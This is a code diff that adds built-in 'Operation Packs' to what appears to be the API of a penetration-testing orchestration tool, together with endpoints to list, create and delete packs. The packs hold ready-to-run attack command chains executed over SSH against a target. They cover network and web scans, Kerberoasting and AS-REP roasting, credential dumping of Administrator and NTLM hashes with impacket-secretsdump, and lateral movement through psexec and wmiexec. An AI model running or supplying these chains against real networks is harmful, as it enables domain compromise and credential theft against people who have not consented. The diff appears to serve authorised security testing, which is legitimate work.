@@ -1688,3 +1688,172 @@ async def import_custom_playbooks(
         created += 1
     db.commit()
     return {"created": created, "skipped": skipped}
+
+
+# ── Operation Packs ───────────────────────────────────────────────────────────
+
+_BUILTIN_PACKS = [
+    {
+        "id": "pack_builtin_initial_recon",
+        "name": "Initial Recon",
+        "description": "Fast host discovery + port scan + service version detection",
+        "tags": ["recon", "nmap"],
+        "steps": [
+            {"title": "Ping sweep", "connector_key": "nmap", "operation": "ping_sweep",
+             "params": {"target": "{target}"}, "on_success": "next", "on_failure": "continue",
+             "on_success_step": None, "on_failure_step": None, "result_conditions": []},
+            {"title": "Port scan (top 1000)", "connector_key": "nmap", "operation": "scan",
+             "params": {"target": "{target}", "flags": "-sV -sC -T4 --open --top-ports 1000"},
+             "on_success": "next", "on_failure": "stop",
+             "on_success_step": None, "on_failure_step": None, "result_conditions": []},
+            {"title": "UDP top ports", "connector_key": "nmap", "operation": "scan",
+             "params": {"target": "{target}", "flags": "-sU --top-ports 20 -T4"},
+             "on_success": "next", "on_failure": "continue",
+             "on_success_step": None, "on_failure_step": None, "result_conditions": []},
+        ],
+    },
+    {
+        "id": "pack_builtin_web_enum",
+        "name": "Web Enumeration",
+        "description": "HTTP/HTTPS service detection, directory busting, tech fingerprinting",
+        "tags": ["web", "enum"],
+        "steps": [
+            {"title": "Web port scan", "connector_key": "nmap", "operation": "scan",
+             "params": {"target": "{target}", "flags": "-sV -p 80,443,8080,8443,8000,8888 -T4"},
+             "on_success": "next", "on_failure": "stop",
+             "on_success_step": None, "on_failure_step": None, "result_conditions": []},
+            {"title": "Nikto scan", "connector_key": "ssh_exec", "operation": "exec",
+             "params": {"command": "nikto -h {target} 2>&1 | head -100"},
+             "on_success": "next", "on_failure": "continue",
+             "on_success_step": None, "on_failure_step": None, "result_conditions": []},
+            {"title": "Gobuster dir", "connector_key": "ssh_exec", "operation": "exec",
+             "params": {"command": "gobuster dir -u http://{target} -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 30 2>&1"},
+             "on_success": "next", "on_failure": "continue",
+             "on_success_step": None, "on_failure_step": None, "result_conditions": []},
+        ],
+    },
+    {
+        "id": "pack_builtin_ad_enum",
+        "name": "AD Enumeration",
+        "description": "Active Directory recon: domain info, users, SPNs, delegation",
+        "tags": ["ad", "enum", "impacket"],
+        "steps": [
+            {"title": "Domain info (crackmapexec)", "connector_key": "ssh_exec", "operation": "exec",
+             "params": {"command": "crackmapexec smb {target} 2>&1"},
+             "on_success": "next", "on_failure": "continue",
+             "on_success_step": None, "on_failure_step": None, "result_conditions": []},
+            {"title": "Enumerate users (impacket)", "connector_key": "ssh_exec", "operation": "exec",
+             "params": {"command": "impacket-GetADUsers '{domain}/{username}:{password}' -dc-ip {target} -all 2>&1"},
+             "on_success": "next", "on_failure": "continue",
+             "on_success_step": None, "on_failure_step": None, "result_conditions": []},
+            {"title": "Kerberoasting", "connector_key": "ssh_exec", "operation": "exec",
+             "params": {"command": "impacket-GetUserSPNs '{domain}/{username}:{password}' -dc-ip {target} -request -outputfile /tmp/kerberoast.txt 2>&1 && echo DONE"},
+             "on_success": "next", "on_failure": "continue",
+             "on_success_step": None, "on_failure_step": None, "result_conditions": []},
+            {"title": "AS-REP Roasting", "connector_key": "ssh_exec", "operation": "exec",
+             "params": {"command": "impacket-GetNPUsers '{domain}/' -dc-ip {target} -no-pass -usersfile /tmp/users.txt 2>&1"},
+             "on_success": "next", "on_failure": "continue",
+             "on_success_step": None, "on_failure_step": None, "result_conditions": []},
+        ],
+    },
+    {
+        "id": "pack_builtin_cred_dump",
+        "name": "Credential Dump",
+        "description": "Local credential harvesting: SAM, LSA, LSASS dump",
+        "tags": ["creds", "post-exploitation", "impacket"],
+        "steps": [
+            {"title": "SAM dump (impacket)", "connector_key": "ssh_exec", "operation": "exec",
+             "params": {"command": "impacket-secretsdump '{domain}/{username}:{password}@{target}' -just-dc-user Administrator 2>&1"},
+             "on_success": "next", "on_failure": "continue",
+             "on_success_step": None, "on_failure_step": None, "result_conditions": []},
+            {"title": "LSA secrets", "connector_key": "ssh_exec", "operation": "exec",
+             "params": {"command": "impacket-secretsdump '{domain}/{username}:{password}@{target}' -just-dc-ntlm 2>&1"},
+             "on_success": "next", "on_failure": "continue",
+             "on_success_step": None, "on_failure_step": None, "result_conditions": []},
+            {"title": "DPAPI secrets", "connector_key": "ssh_exec", "operation": "exec",
+             "params": {"command": "impacket-dpapi.py masterkey -file /path/to/masterkey -sid S-1-5-21-... 2>&1"},
+             "on_success": "next", "on_failure": "continue",
+             "on_success_step": None, "on_failure_step": None, "result_conditions": []},
+        ],
+    },
+    {
+        "id": "pack_builtin_lateral_smb",
+        "name": "Lateral Movement (SMB)",
+        "description": "Lateral movement via SMB: share enum, exec, pivot setup",
+        "tags": ["lateral", "smb", "impacket"],
+        "steps": [
+            {"title": "SMB share enum", "connector_key": "ssh_exec", "operation": "exec",
+             "params": {"command": "crackmapexec smb {target} -u '{username}' -p '{password}' --shares 2>&1"},
+             "on_success": "next", "on_failure": "stop",
+             "on_success_step": None, "on_failure_step": None, "result_conditions": []},
+            {"title": "Execute command (psexec)", "connector_key": "ssh_exec", "operation": "exec",
+             "params": {"command": "impacket-psexec '{domain}/{username}:{password}@{target}' 'whoami /all' 2>&1"},
+             "on_success": "next", "on_failure": "continue",
+             "on_success_step": None, "on_failure_step": None, "result_conditions": []},
+            {"title": "WMI exec", "connector_key": "ssh_exec", "operation": "exec",
+             "params": {"command": "impacket-wmiexec '{domain}/{username}:{password}@{target}' 'whoami /all' 2>&1"},
+             "on_success": "next", "on_failure": "continue",
+             "on_success_step": None, "on_failure_step": None, "result_conditions": []},
+        ],
+    },
+]
+
+
+class OperationPackCreate(BaseModel):
+    name: str
+    description: str = ""
+    steps: list = []
+    tags: list[str] = []
+
+
+@router.get("/api/playbooks/packs")
+def list_operation_packs(
+    db: Session = Depends(get_db),
+    user: models.User = Depends(get_current_user),
+):
+    custom = db.query(models.OperationPack).order_by(models.OperationPack.name).all()
+    custom_out = [
+        {"id": p.id, "name": p.name, "description": p.description,
+         "steps": p.steps or [], "tags": p.tags or [],
+         "is_builtin": False, "created_by": p.created_by, "created_at": p.created_at}
+        for p in custom
+    ]
+    return {"packs": _BUILTIN_PACKS + custom_out}
+
+
+@router.post("/api/playbooks/packs", status_code=201)
+def create_operation_pack(
+    body: OperationPackCreate,
+    db: Session = Depends(get_db),
+    user: models.User = Depends(get_current_user),
+):
+    now = datetime.now(timezone.utc).isoformat()
+    pack = models.OperationPack(
+        id=f"pack_{uuid4().hex[:10]}",
+        name=body.name,
+        description=body.description,
+        steps=body.steps,
+        tags=body.tags,
+        is_builtin=False,
+        created_by=user.username,
+        created_at=now,
+    )
+    db.add(pack)
+    db.commit()
+    db.refresh(pack)
+    return {"id": pack.id, "name": pack.name, "description": pack.description,
+            "steps": pack.steps or [], "tags": pack.tags or [],
+            "is_builtin": False, "created_by": pack.created_by, "created_at": pack.created_at}
+
+
+@router.delete("/api/playbooks/packs/{pack_id}", status_code=204)
+def delete_operation_pack(
+    pack_id: str,
+    db: Session = Depends(get_db),
+    user: models.User = Depends(get_current_user),
+):
+    pack = db.query(models.OperationPack).filter(models.OperationPack.id == pack_id).first()
+    if not pack:
+        raise HTTPException(404, "Pack not found")
+    db.delete(pack)
+    db.commit()
